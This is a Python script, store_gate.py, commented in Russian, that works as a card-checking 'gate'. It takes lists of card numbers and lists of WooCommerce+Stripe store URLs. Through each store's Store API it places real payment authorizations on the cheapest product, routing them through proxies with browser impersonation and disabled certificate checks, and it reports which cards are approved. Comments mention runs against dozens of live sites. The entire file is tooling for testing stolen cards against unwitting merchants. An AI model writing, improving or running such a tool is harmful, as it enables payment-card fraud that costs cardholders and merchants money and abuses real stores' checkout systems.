# language: Python 3.12+, file: store_gate.py, target: Windows 11
# Sprint 3 (Фаза 2): Woo Store API прямой конфирм — третья боевая поверхность.
# Работает там, где нет ни SetupIntent-гейта, ни торчащих секретов:
# любая WooCommerce+Stripe Blocks-корзина.
#
# ВАЖНО: это ПЛАТЁЖНАЯ авторизация на сумму товара (не $0-auth).
# Крышка: берём самый дешёвый продукт каталога, отказ если дороже max-price.
import argparse
import asyncio
import random
import re
import sys
from pathlib import Path

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
from setup_gate import bin_lookup, bin_summary  # A1: единая кэшированная реализация (дубль убран)

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

MAX_PRICE_CENTS = 2000  # $20 крышка: под $2 работали только 2 сайта из 44 (прогон 2026-08-27)


async def check_target(root: str, card_raw: str, proxy: str | None,
                       max_price_cents: int) -> dict:
    prefix = gc.extract_pan(card_raw)[:6]  # BIN из PAN — любой разделитель
    binfo = await bin_lookup(prefix)
    country = gc.bin_alpha2(binfo) or "US"

    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
        res = await gc.store_api_confirm(s, root, "", card_raw,
                                         country=country,
                                         max_price_cents=max_price_cents)
    res["card"] = gc.mask_pan(card_raw)
    res["bin"] = bin_summary(binfo)
    res["target"] = root
    return res


async def main():
    ap = argparse.ArgumentParser(description="Store API direct-confirm gate")
    ap.add_argument("target", help="https://store-root (или файл со списком)")
    ap.add_argument("cards", nargs="*", help="CC|MM|YY|CVC или файл")
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--max-price", type=int, default=MAX_PRICE_CENTS,
                    help=f"крышка суммы товара в центах (default {MAX_PRICE_CENTS} = $20)")
    args = ap.parse_args()

    if args.target.startswith("http"):
        targets = [args.target.rstrip("/")]
    else:
        p = Path(args.target)
        targets = [ln.strip().rstrip("/") for ln in p.read_text(encoding="utf-8").splitlines()
                   if ln.strip().startswith("http")]

    cards = []
    for c in args.cards:
        pp = Path(c)
        if pp.exists():
            # любой разделитель (| : / пробел) — фильтруем по числу полей,
            # не только по '|', иначе ':'- и пробельные карты молча терялись
            for ln in pp.read_text(encoding="utf-8").splitlines():
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                if len(re.split(r"[|:/\s]+", ln)) >= 4:
                    cards.append(ln)
        else:
            cards.append(c)

    if not cards:
        probe = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] No cards given - random Luhn-valid probe: {gc.mask_pan(cards[0])}")

    print("=" * 80)
    print("[*] STORE API DIRECT-CONFIRM GATE (paid-auth, cheapest product <= "
          f"{args.max_price}c)")
    print(f"[*] Targets: {len(targets)} | Cards: {len(cards)} | Proxy: {args.proxy or 'direct'}")
    print("=" * 80)

    for t in targets:
        for i, card_raw in enumerate(cards):
            try:
                res = await check_target(t, card_raw, args.proxy, args.max_price)
            except Exception as e:
                res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150],
                       "card": gc.mask_pan(card_raw), "bin": "-", "target": t}
            icon = config.icon(res["status"])
            paid = f" [{res['amount_cents']}c {res['currency']}]" \
                if res.get("amount_cents") else ""
            print(f"{icon} [{res['status']:16}] {t} <- {res['card']}{paid}")
            print(f"     BIN: {res.get('bin')} | {res['detail']}")
            if i < len(cards) - 1:
                await asyncio.sleep(1.5)


if __name__ == "__main__":
    asyncio.run(main())
